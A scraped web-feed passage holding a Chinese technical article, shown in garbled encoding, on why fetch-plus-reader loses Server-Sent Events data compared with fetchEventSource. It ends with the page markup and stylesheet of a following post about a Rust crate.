<p><strong>SSEï¼ˆServer-Sent Eventsï¼‰</strong> æ˜¯ä¸€ç§åŸºäº<code>HTTP</code>çš„å•å‘æ¨é€åè®®ï¼Œæµè§ˆå™¨é€šè¿‡ä¸€æ¬¡æ™®é€šçš„<code>HTTP</code>è¯·æ±‚ï¼Œä¸æœåŠ¡ç«¯å»ºç«‹ä¸€æ¡<strong>é•¿è¿æ¥</strong>ï¼Œä¹‹åæœåŠ¡ç«¯å¯ä»¥æŒç»­å‘å®¢æˆ·ç«¯æ¨é€äº‹ä»¶æ•°æ®ã€‚</p>
<p>å®ƒçš„å‡ ä¸ªå…³é”®ç‰¹å¾éå¸¸é‡è¦ï¼š</p>
<ul>
<li>åŸºäº <strong>HTTP/1.1 æˆ– HTTP/2</strong></li>
<li>æœåŠ¡ç«¯ä¸»åŠ¨æ¨é€ï¼Œ<strong>å®¢æˆ·ç«¯åªæ¥æ”¶</strong></li>
<li>æ•°æ®æ ¼å¼æ˜¯<strong>çº¯æ–‡æœ¬</strong></li>
<li>ä½¿ç”¨<code>text/event-stream</code>ä½œä¸º<code>Content-Type</code></li>
</ul>
<p>åœ¨å‰ç«¯ä»£ç ä¸­ï¼Œå¯ä»¥çœ‹åˆ°è¿™ä¸ªè¯·æ±‚å¤´ï¼š</p>
<pre><code class="hljs language-vbnet" lang="vbnet"><span class="hljs-symbol">Accept:</span> <span class="hljs-keyword">text</span>/<span class="hljs-keyword">event</span>-stream
</code></pre>
<p>è¿™å¹¶ä¸æ˜¯éšä¾¿å†™çš„ï¼Œè€Œæ˜¯æ˜ç¡®å‘Šè¯‰æœåŠ¡ç«¯ï¼š<strong>æˆ‘æœŸæœ›ä½ ç”¨SSEåè®®æ ¼å¼ï¼ŒæŒç»­å‘æˆ‘æ¨é€äº‹ä»¶ã€‚</strong></p>
<h3 data-id="heading-5">SSEå¹¶ä¸æ˜¯â€œéšä¾¿åå­—ç¬¦ä¸²â€</h3>
<p>æˆ‘ä»¬å¾ˆå¤šäººè¯¯ä»¥ä¸º<code>SSE</code>å°±æ˜¯â€œæœåŠ¡ç«¯ä¸æ–­<code>res.write()</code>å­—ç¬¦ä¸²â€ï¼Œè¿™æ˜¯å¯¼è‡´åç»­å„ç§è§£æé—®é¢˜çš„æ ¹æºã€‚</p>
<p><strong>SSEæ˜¯æœ‰ä¸¥æ ¼æ–‡æœ¬æ ¼å¼è§„èŒƒçš„ã€‚</strong> ä¸€æ¡æœ€åŸºæœ¬çš„<code>SSE</code>äº‹ä»¶é•¿è¿™æ ·ï¼š</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">data</span>: hello world
</code></pre>
<p>æ³¨æ„ä¸¤ä¸ªéå¸¸å…³é”®çš„ç‚¹ï¼š</p>
<ol>
<li>æ¯ä¸€è¡Œä»¥å­—æ®µåå¼€å¤´ï¼ˆæœ€å¸¸è§çš„æ˜¯<code>data:</code>ï¼‰</li>
<li><strong>ä¸¤ä¸ªæ¢è¡Œç¬¦<code>\n\n</code> æ‰è¡¨ç¤ºä¸€æ¡äº‹ä»¶çš„ç»“æŸ</strong></li>
</ol>
<p>å®Œæ•´ä¸€ç‚¹çš„äº‹ä»¶å¯èƒ½æ˜¯ï¼š</p>
<pre><code class="hljs language-makefile" lang="makefile"><span class="hljs-section">id: 123</span>
<span class="hljs-section">event: message</span>
<span class="hljs-section">data: hello</span>
<span class="hljs-section">data: world</span>
</code></pre>
<p>æµè§ˆå™¨åœ¨è§£ææ—¶ï¼Œä¼šæŠŠå¤šè¡Œ<code>data:</code>è‡ªåŠ¨æ‹¼æ¥æˆä¸€æ¡å®Œæ•´æ¶ˆæ¯ï¼š</p>
<pre><code class="hljs">hello
world
</code></pre>
<p>æœ€ç»ˆäº¤ç»™ä¸Šå±‚çš„ï¼Œå°±æ˜¯ä¸€æ¡<strong>å®Œæ•´çš„äº‹ä»¶æ•°æ®</strong>ã€‚</p>
<p>åˆ°è¿™é‡Œï¼Œ<code>SSE</code>åè®®ä¹Ÿä»‹ç»çš„å·®ä¸å¤šäº†ï¼ŒåŒæ—¶æˆ‘ä»¬ä¹Ÿå¤§è‡´é€æäº†ä¸€ç‚¹åœ¨é¡¹ç›®ä¸­ä¸ºå•¥ä¼šé€‰æ‹©ä½¿ç”¨<code>fetchEventSource</code>çš„åŸå› äº†ï¼Œä¸‹é¢å†æ¥çœ‹çœ‹è¿™ä¸¤ç§å®ç°æ–¹æ³•çš„æœ¬è´¨åŒºåˆ«ã€‚</p>
<h2 data-id="heading-6">ä¸‰ã€ä¸¤è€…æœ€æ ¸å¿ƒçš„æœ¬è´¨åŒºåˆ«ï¼ˆä¸æ˜¯APIï¼Œè€Œæ˜¯å±‚çº§ï¼‰</h2>








































<table><thead><tr><th>å¯¹æ¯”ç»´åº¦</th><th>fetchEventSource</th><th>fetch + reader</th></tr></thead><tbody><tr><td>å·¥ä½œå±‚çº§</td><td>äº‹ä»¶å±‚ï¼ˆSSEåè®®ï¼‰</td><td>å­—èŠ‚æµå±‚ï¼ˆTCP chunkï¼‰</td></tr><tr><td>æ˜¯å¦ç†è§£<code>data:</code> / <code>\n\n</code></td><td>âœ… å†…ç½®</td><td>âŒ éœ€è¦æ‰‹å†™</td></tr><tr><td>æ˜¯å¦ä¿è¯ä¸€æ¡æ¶ˆæ¯å®Œæ•´</td><td>âœ… æ˜¯</td><td>âŒ å¦</td></tr><tr><td>æ˜¯å¦è‡ªåŠ¨ç¼“å†²</td><td>âœ… æ˜¯</td><td>âŒ å¦</td></tr><tr><td>æ˜¯å¦å¤„ç†æ‹†åŒ…/ç²˜åŒ…</td><td>âœ… æ˜¯</td><td>âŒ å¦</td></tr><tr><td>ä¸¢æ•°æ®é£é™©</td><td>æä½</td><td>å¾ˆé«˜</td></tr></tbody></table>
<p>ä¸€å¥è¯æ€»ç»“ï¼š</p>
<blockquote>
<p><strong>fetchEventSourceæ¶ˆè´¹çš„æ˜¯â€œè¯­ä¹‰å®Œæ•´çš„äº‹ä»¶â€<br/>
fetch + readeræ¶ˆè´¹çš„æ˜¯â€œè¿˜æ²¡æˆå½¢çš„å­—èŠ‚ç¢ç‰‡â€</strong></p>
</blockquote>
<h2 data-id="heading-7">ä¸‰ã€é‡ç‚¹ï¼šä¸ºä»€ä¹ˆfetchæ–¹å¼æ›´å®¹æ˜“â€œä¸¢æ•°æ®â€ï¼Ÿ</h2>
<p>é€šè¿‡ä¸Šé¢çš„å¯¹æ¯”ï¼Œæˆ‘ä»¬æ¸…æ¥šäº†ä¸¤è€…æœ€æœ¬è´¨çš„åŒºåˆ«ï¼Œä½†æ˜¯è¿˜æ˜¯è¦å›åˆ°ä»£ç æœ¬èº«ï¼Œæ¥çœ‹çœ‹åˆ°åº•æ˜¯ä»€ä¹ˆåŸå› å¯¼è‡´<code>fetch</code>æ–¹å¼â€œä¸¢æ•°æ®â€â†’</p>
<h3 data-id="heading-8">1ï¸âƒ£ é¦–å…ˆæ˜ç¡®ä¸€ç‚¹ï¼šTCPä¸ä¼šä¸¢åŒ…ï¼Œä½†ä½ ä¼šâ€œè¯»ä¸¢â€</h3>
<p>å¾ˆå¤šäººè¯´â€œ<code>fetch</code>ä¼šä¸¢åŒ…â€ï¼Œè¿™æ˜¯<strong>ä¸ä¸¥è°¨ä½†å·¥ç¨‹ä¸Šæˆç«‹</strong>çš„è¯´æ³•ã€‚</p>
<p>å‡†ç¡®è®²æ˜¯ï¼š<strong>TCPå±‚ä¸ä¸¢ï¼Œä½†å‰ç«¯çš„â€œè§£ææ–¹å¼â€å¯¼è‡´äº†è¯­ä¹‰ä¸¢å¤±</strong></p>
<h3 data-id="heading-9">2ï¸âƒ£ ä¸¢æ•°æ®çš„ç¬¬ä¸€ä¸ªåŸå› ï¼šSSEæ¶ˆæ¯è¢«æ‹†æˆå¤šä¸ªchunk</h3>
<p>åœ¨ä¸Šé¢ä»‹ç»<code>SSE</code>åè®®ä¸­ï¼Œæˆ‘ä»¬æ¸…æ¥šçŸ¥é“ä¸€æ¡æœ€åŸºæœ¬çš„<code>SSE</code>äº‹ä»¶æ˜¯å•¥æ ·çš„ï¼Œè¿™é‡Œå¸¦å…¥ä¸€ä¸‹çœŸå®è¯·æ±‚å†ä»‹ç»ä¸€ä¸‹ä¸€æ¡<code>SSE</code>äº‹ä»¶çš„å®Œæ•´è¿‡ç¨‹ï¼š</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">data</span>:xxx
<span class="hljs-keyword">data</span>:yyy
</code></pre>
<p>ä½†åœ¨ç½‘ç»œå±‚ï¼Œå®ƒ<strong>å¯èƒ½ä¼šè¢«æ‹†æˆè¿™æ ·åˆ°è¾¾å‰ç«¯</strong>ï¼š</p>
<pre><code class="hljs language-scss" lang="scss">ç¬¬<span class="hljs-number">1</span>æ¬¡ <span class="hljs-built_in">read</span>(): <span class="hljs-string">"data:xxx\ndata:"</span>
ç¬¬<span class="hljs-number">2</span>æ¬¡ <span class="hljs-built_in">read</span>(): <span class="hljs-string">"yyy\n\n"</span>
</code></pre>
<p>è€Œåœ¨ä»£ç é‡Œï¼š</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">chunk</span> = decoder.decode(value)
<span class="hljs-attr">chunk</span> = chunk.replaceAll(<span class="hljs-string">'data:'</span>, <span class="hljs-string">''</span>)
<span class="hljs-attr">chunk</span> = chunk.replace(/\n+/g, <span class="hljs-string">''</span>)
inputValue.value += chunk
</code></pre>
<p>é—®é¢˜æ¥äº†ï¼š</p>
<ul>
<li>å‡è®¾<code>chunk</code>ä¸€å®šæ˜¯â€œå®Œæ•´è¯­ä¹‰â€</li>
<li>å®é™…ä¸Š<code>chunk</code>åªæ˜¯ <strong>ä»»æ„åˆ‡å‰²çš„å­—èŠ‚ç‰‡æ®µ</strong></li>
<li><code>replace + æ‹¼æ¥</code>æ˜¯<strong>ç ´åæ€§æ“ä½œ</strong></li>
</ul>
<p>ğŸ‘‰ ä¸€æ—¦æ‹†åœ¨<code>data:</code>ã€<code>RECORD_ID:</code>ã€<code>:end</code>ä¸­é—´ï¼Œ<br/>
<strong>è¿™ä¸€æ®µè¯­ä¹‰å°±å†ä¹Ÿè¿˜åŸä¸å›æ¥äº†</strong></p>
<p>è¿™å°±æ˜¯<strong>çœ‹èµ·æ¥æ²¡æŠ¥é”™ï¼Œä½†å†…å®¹å°‘å­—ã€ä¹±å­—</strong>çš„æ ¹æºã€‚</p>
<h3 data-id="heading-10">3ï¸âƒ£ ç¬¬äºŒä¸ªåŸå› ï¼šchunkä¸­å¯èƒ½åŒ…å«ã€Œå¤šæ¡æ¶ˆæ¯ã€</h3>
<p>åè¿‡æ¥ï¼ŒæœåŠ¡ç«¯ä¸€æ¬¡<code>flush</code>ï¼Œä¹Ÿå¯èƒ½è¢«æµè§ˆå™¨åˆå¹¶æˆä¸€ä¸ª<code>chunk</code>ï¼š</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">data</span>:hello\n\n
<span class="hljs-keyword">data</span>:world\n\n
</code></pre>
<p>ä¸€æ¬¡<code>read()</code>æ‹¿åˆ°ï¼š</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">data</span>:hello\n\ndata:world\n\n
</code></pre>
<p>è€Œåœ¨ä»£ç é‡Œï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript">chunk.<span class="hljs-title function_">replaceAll</span>(<span class="hljs-string">'data:'</span>, <span class="hljs-string">''</span>)
chunk.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/\n+/g</span>, <span class="hljs-string">''</span>)
</code></pre>
<p>ä¼šç›´æ¥å˜æˆï¼š</p>
<pre><code class="hljs">helloworld
</code></pre>
<p>åˆ°è¿™é‡Œå¯ä»¥å‘ç°å·²ç»<strong>ä¸¢æ‰äº†â€œäº‹ä»¶è¾¹ç•Œâ€è¿™ä¸ªæœ€é‡è¦çš„ä¿¡æ¯</strong>ã€‚</p>
<h3 data-id="heading-11">4ï¸âƒ£ ç¬¬ä¸‰ä¸ªåŸå› ï¼šTextDecoderä½¿ç”¨æ–¹å¼æœ¬èº«å°±æœ‰å‘</h3>
<pre><code class="hljs language-php" lang="php">decoder.<span class="hljs-title function_ invoke__">decode</span>(value, { <span class="hljs-attr">stream</span>: <span class="hljs-literal">false</span> })
</code></pre>
<ul>
<li><code>stream: false</code> è¡¨ç¤º<strong>æ¯æ¬¡éƒ½æ˜¯ä¸€ä¸ªâ€œç‹¬ç«‹å­—ç¬¦ä¸²â€</strong></li>
<li>å¦‚æœ<code>UTF-8</code>å­—ç¬¦è¢«æ‹†æˆ2æ¬¡<code>Uint8Array</code></li>
<li><strong>å¤šå­—èŠ‚å­—ç¬¦ä¼šç›´æ¥æŸå</strong></li>
</ul>
<p>æ­£ç¡®æ–¹å¼å…¶å®æ˜¯ï¼š</p>
<pre><code class="hljs language-php" lang="php">decoder.<span class="hljs-title function_ invoke__">decode</span>(value, { <span class="hljs-attr">stream</span>: <span class="hljs-literal">true</span> })
</code></pre>
<p>ä½†å³ä¾¿å¦‚æ­¤ï¼Œ<strong>è¯­ä¹‰è¾¹ç•Œé—®é¢˜ä¾ç„¶å­˜åœ¨</strong>ã€‚</p>
<h2 data-id="heading-12">å››ã€ä¸ºä»€ä¹ˆfetchEventSourceå‡ ä¹ä¸ä¼šå‡ºç°è¿™äº›é—®é¢˜ï¼Ÿ</h2>
<p>å› ä¸ºå®ƒ<strong>å·²ç»å¸®ä½ åšå®Œäº†è¿™äº›è„æ´»</strong></p>
<h3 data-id="heading-13">fetchEventSourceå†…éƒ¨åšäº†ä»€ä¹ˆï¼Ÿ</h3>
<ol>
<li>æŒç»­è¯»å–<code>response stream</code></li>
<li>å†…éƒ¨ç»´æŠ¤ä¸€ä¸ª<code>buffer</code></li>
<li>æŒ‰<code>SSE</code>è§„èŒƒè§£æï¼š
<ul>
<li><code>data:</code></li>
<li><code>id:</code></li>
<li><code>event:</code></li>
<li><code>\n\n</code>ä½œä¸ºäº‹ä»¶ç»“æŸæ ‡å¿—</li>
</ul>
</li>
<li><strong>åªæœ‰åœ¨ä¸€æ•´æ¡äº‹ä»¶å®Œæ•´å</strong>
<ul>
<li>æ‰è§¦å‘<code>onmessage</code></li>
<li>å¹¶ä¸”ä¿è¯<code>e.data</code>æ˜¯å®Œæ•´å­—ç¬¦ä¸²</li>
</ul>
</li>
</ol>
<p>ğŸ‘‰ æ‰€ä»¥æ‹¿åˆ°çš„æ°¸è¿œæ˜¯ï¼š</p>
<pre><code class="hljs language-css" lang="css">{
  data: <span class="hljs-string">"{...å®Œæ•´JSON...}"</span>
}
</code></pre>
<p>è€Œä¸æ˜¯ç¢ç‰‡ã€‚</p>
<h2 data-id="heading-14">äº”ã€ç»“è®ºï¼ˆéå¸¸é‡è¦ï¼‰</h2>
<h3 data-id="heading-15">âœ… ä»€ä¹ˆåœºæ™¯å¿…é¡»ç”¨ fetchEventSourceï¼Ÿ</h3>
<ul>
<li><code>SSE / text-event-stream</code></li>
<li><code>AI</code>æµå¼è¾“å‡º</li>
<li><code>OCR</code>/<code>LLM</code>/é•¿æ–‡æœ¬é€æ­¥è¿”å›</li>
<li>éœ€è¦<strong>ä¸¥æ ¼ä¿è¯å†…å®¹ä¸ä¸¢ã€ä¸ä¹±ã€ä¸å°‘</strong></li>
</ul>
<p>ğŸ‘‰ <strong>é¦–é€‰ fetchEventSource</strong></p>
<h3 data-id="heading-16">âš ï¸ ä»€ä¹ˆæ—¶å€™æ‰è¯¥ç”¨fetch + readerï¼Ÿ</h3>
<ul>
<li>æ˜ç¡®çŸ¥é“è¿™æ˜¯ï¼š
<ul>
<li>äºŒè¿›åˆ¶æµ</li>
<li>æ–‡ä»¶æµ</li>
<li>è‡ªå®šä¹‰åè®®</li>
</ul>
</li>
<li>æˆ–è€…ï¼š
<ul>
<li>è‡ªå·±å®ç°å®Œæ•´buffer</li>
<li>è‡ªå·±æŒ‰<code>\n\n</code> æ‹†äº‹ä»¶</li>
<li>æ˜ç¡®å¤„ç†æ‹†åŒ…ã€ç²˜åŒ…ã€UTF-8è¾¹ç•Œ
å¦åˆ™ï¼š</li>
</ul>
</li>
</ul>
<blockquote>
<p><strong>fetch + reader â‰  SSEå®¢æˆ·ç«¯<br/>
åªæ˜¯ä¸€ä¸ªâ€œå­—èŠ‚è¯»å–å·¥å…·â€</strong></p>
</blockquote>
<p>æœ€åï¼Œä¸€å¥è¯æ€»ç»“ï¼š<strong>fetchEventSourceæ˜¯â€œåè®®çº§æ¶ˆè´¹â€ï¼Œå¤©ç„¶é˜²ä¸¢åŒ…ï¼›è€Œfetchæµè¯»å–æ˜¯â€œå­—èŠ‚çº§æ¶ˆè´¹â€ï¼Œææ˜“åœ¨è§£æé˜¶æ®µä¸¢è¯­ä¹‰</strong></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[rust crate undoc ä»‹ç»]]></title>    <link>https://juejin.cn/post/7592501225004056627</link>    <guid>https://juejin.cn/post/7592501225004056627</guid>    <pubDate>2026-01-07T15:47:00.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592501225004056627" data-draft-id="7592455394062811174" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="rust crate undoc ä»‹ç»"/> <meta itemprop="keywords" content="Rust"/> <meta itemprop="datePublished" content="2026-01-07T15:47:00.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Andrew_Ryan"/> <meta itemprop="url" content="https://juejin.cn/user/3993068510655703"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            rust crate undoc ä»‹ç»
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3993068510655703/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Andrew_Ryan
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-07T15:47:00.000Z" title="Wed Jan 07 2026 15:47:00 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-07
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    3
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.7;font-weight:400;font-size:16px;overflow-x:hidden;color:#212122}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-bottom:8px;padding-bottom:8px}.markdown-body h1{color:#a0a0a0;font-size:38px;margin-top:32px;padding-top:32px}.markdown-body h2{color:#fff;background-color:#212122;width:fit-content;border-bottom-right-radius:100px;margin-top:47px;margin-bottom:16px;padding:4px 48px 4px 8px;line-height:1.7;font-size:30px;transition:all .3s ease-out}.markdown-body h2:hover{border-bottom-right-radius:50px;transition:all .3s ease-out}.markdown-body h3{font-size:24px;padding-left:8px;margin-top:32px;border-bottom:2px solid #c6c4c4;line-height:1.7}.markdown-body h4{font-size:20px;padding-left:8px;margin-top:32px;border-bottom:1px solid #ddd}.markdown-body h5{font-size:16px;margin-top:24px}.markdown-body h6{margin-top:16px;line-height:1.1}.markdown-body p{font-size:16px;text-align:start;white-space:normal;text-size-adjust:auto;line-height:2;margin-top:16px;margin-bottom:16px}.markdown-body img{max-width:100%;margin:auto;padding-left:8px;padding-right:8px}.markdown-body hr{border:none;border-top:4px double #212122;margin-top:32px;margin-bottom:32px;text-align:center}.markdown-body hr:after{content:"â™¥";display:inline-block;position:relative;top:-15px;padding:0 10px;color:#212122;font-size:18px}.markdown-body code{word-break:break-word;overflow-x:auto;background-color:#f1f1f1;color:#ef7060;font-size:14px;padding:.065em 6px}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace;border-radius:2px}.markdown-body pre{overflow:auto;position:relative;line-height:1.7;box-shadow:0 0 8px hsla(0,0%,43.1%,.45);margin:32px 16px}.markdown-body pre:before{content:"";display:block;height:30px;width:100%;background:url(data:image/png;base64,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) 10px 10px no-repeat;background-color:#212122;box-shadow:0 0 8px hsla(0,0%,43.1%,.45);background-size:40px}.markdown-body pre&gt;code{font-size:14px;padding:16px 8px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#fff;background:#272822}.markdown-body pre&gt;code::-webkit-scrollbar{height:10px;background-color:#f5f5f5}.markdown-body pre&gt;code::-webkit-scrollbar-track{box-shadow:inset 0 0 6px rgba(0,0,0,.3);border-radius:3px;background-color:#f5f5f5}.markdown-body pre&gt;code::-webkit-scrollbar-thumb{border-radius:3px;box-shadow:inset 0 0 6px rgba(0,0,0,.3);background-color:#555}.markdown-body a{color:#ef7060;padding:2px;text-decoration:none;border-bottom:.125em solid #ef7060;border-radius:2px;box-shadow:inset 0 -.025em 0 #ef7060;transition:box-shadow .27s cubic-bezier(.77,0,.175,1),color .27s cubic-bezier(.77,0,.175,1)}.markdown-body a:focus,.markdown-body a:hover{outline:none;box-shadow:inset 0 -1.5em 0 #ef7060;color:#fff}.markdown-body a:before{content:"â‡² ";vertical-align:top;margin-left:2px;font-family:dart!important;font-size:12px;color:inherit;opacity:.7}.markdown-body table{background:#fbfbfb;border-radius:4px;border-collapse:collapse;margin:auto;padding:5px;width:95%;box-shadow:0 5px 10px rgba(0,0,0,.1);animation:float 5s infinite}.markdown-body table th{color:#fff;background:#212122;border-bottom:1px solid #9ea7af;border-right:1px solid #343a45;font-size:18px;padding:16px;text-align:left;vertical-align:middle}.markdown-body table th:first-child{border-top-left-radius:4px}.markdown-body table th:last-child{border-top-right-radius:4px;border-right:none}.markdown-body table tr{border-top:1px solid #c1c3d1;border-bottom:1px solid 